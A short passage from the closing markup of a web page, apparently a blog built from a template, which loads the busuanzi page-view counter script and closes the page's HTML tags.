}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>